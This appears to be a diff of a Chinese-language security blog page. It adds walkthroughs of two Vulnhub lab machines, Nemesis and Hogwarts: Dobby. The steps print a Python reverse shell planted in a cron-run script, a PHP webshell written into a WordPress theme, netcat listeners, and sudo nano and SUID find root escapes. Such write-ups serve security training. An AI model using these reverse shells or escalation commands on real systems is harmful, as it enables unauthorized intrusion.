+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id</span><br><span class="line">ssh thanos@192.168.56.131 -p 52846 -i id</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/13.png" alt="image-"></p>
+<p>5.登录后可在用户目录下发现第一个flag，即flag1.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/14.png" alt="image-"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.我们可以在thanos用户目录下发现属于carlos用户的backup.py：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat backup.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/15.png" alt="image-"></p>
+<p>2.通过利用pspy64s工具，可以发现backup.py是被定时调用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，thanos获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/16.png" alt="image-"></p>
+<p>3.那我们只需要把原backup.py重命名（因为我们没有修改其内容的权限），重新写入一个backup.py，内容为反弹shell就可以：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mv backup.py backup_original.py</span><br><span class="line">vi backup.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">9002</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span>，kali开启对应端口监听</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/17.png" alt="image-"></p>
+<p>4.可以在carlos用户目录下发现第二个flag，即flag2.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.同时在carlos用户目录下还能发现root.txt，查看后是让我们去分析encrypt.py文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/19.png" alt="image-"></p>
+<p>2.查看encrypt.py文件后，联系root.txt，通过位置对应我们能知道FUN的密文是QZA，则可写出解密程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/20.png" alt="image-"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先确定key为key[89, 65]</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">affine_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([ <span class="built_in">chr</span>((( key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>] ) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) ])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">      affine_text=<span class="string">&quot;FUN&quot;</span></span><br><span class="line">      <span class="keyword">for</span> key0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">          <span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">              encrypt_text = affine_encrypt(affine_text, [key0, key1])</span><br><span class="line">              <span class="keyword">if</span> encrypt_text == <span class="string">&quot;QZA&quot;</span>:</span><br><span class="line">                  <span class="built_in">print</span>(key0,key1)</span><br><span class="line">                  sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密程序，得到password为ENCRYPTIONISFUNPASSWORD</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">affine_decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">  text = []</span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> cipher:</span><br><span class="line">      b = <span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">          result = (<span class="number">65</span> + x*<span class="number">89</span> - b) % <span class="number">26</span></span><br><span class="line">          <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">              text.append(<span class="built_in">chr</span>(x + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(text))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">  affine_encrypted_text = <span class="string">&quot;FAJSRWOXLAXDQZAWNDDVLSU&quot;</span></span><br><span class="line">  affine_decrypt(affine_encrypted_text)</span><br></pre></td></tr></table></figure>
+
+<p>3.再进行文件权限查看，发现可以使用nano进行提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/21.png" alt="image-"></p>
+<p>4.在gtfobins上查询nano提权方式，成功提权到root：</p>
+<p><img src="/2022/08/15/IA-Nemesis/22.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su carlos，在thanos用户下登录到carlos，password是ENCRYPTIONISFUNPASSWORD</span><br><span class="line">sudo -u root /bin/nano /opt/priv</span><br><span class="line">ctrl+r,ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/23.png" alt="image-"></p>
+<p>5.在&#x2F;root目录下可以发现第三个flag，即root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/24.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Dobby/">
+                Hogwarts Dobby
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-dobby">HOGWARTS: DOBBY</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-dobby">名称：Hogwarts: Dobby</span></h4><h4><span id="发布日期2020118">发布日期：2020.11.8</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;proof.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名dobbyova">文件名：dobby.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsdobbyova">下载地址：</span></h4><h4><span id="md5-11b9fd40b70344a71b432a608ee640ab">MD5: 11B9FD40B70344A71B432A608EE640AB</span></h4><h4><span id="sha1-68110b92fd58d6a4c8f0cdbe169e29259ac797a6">SHA1: 68110B92FD58D6A4C8F0CDBE169E29259AC797A6</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机dobby和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了80端口，访问主页，还是apache的默认页，但源码有路径提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.126 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，&#x2F;log目录值得关注一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.126 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="网页发现">网页发现</span></h3><blockquote>
+<p>1.访问&#x2F;alohomora目录，发现Draco用户的密码提示：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/7.png" alt="image-"></p>
+<p>2.访问&#x2F;log目录，发现直接提示了一个密码和路径：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/8.png" alt="image-"></p>
+<p>3.继续访问&#x2F;DiagonAlley，发现一串brainfuck编码，且这个页面是用wordpress搭建的：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/9.png" alt="image-"></p>
+<p>4.将brainfuck字串解码，但解出来是乱码：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/10.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress后台登录写入shell">Wordpress后台登录，写入shell</span></h3><blockquote>
+<p>1.再从wordpress入手，用wpscan进行扫描，但没有过多问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.126/DiagonAlley --detection-mode aggressive</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/11.png" alt="image-"></p>
+<p>2.进入wp-login.php后台页，我们有用户draco，而提示他的马的名字slytherin就是密码：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/12.png" alt="image-"></p>
+<p>3.进入wordpress后台后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行ip及端口修改，在Apariencia-Editor de temas-Error 404页写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/13.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/14.png" alt="image-"></p>
+<p>4.在kali开启对应端口监听，访问&#x2F;DiagonAlley目录下不存在页即可触发shell，再利用python构建交互式shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/15.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查找有suid的文件，发现find：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | grep usr/bin</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/17.png" alt="image-"></p>
+<p>2.利用find可以直接提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">vi proof.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/19.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
@@ -1161,7 +1195,39 @@
                         <a href="/tags"
                            onfocus="this.blur();"
                            class="nav-tags dark-btn block">
-                            标签
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
                         </a>
                     </li>
                 
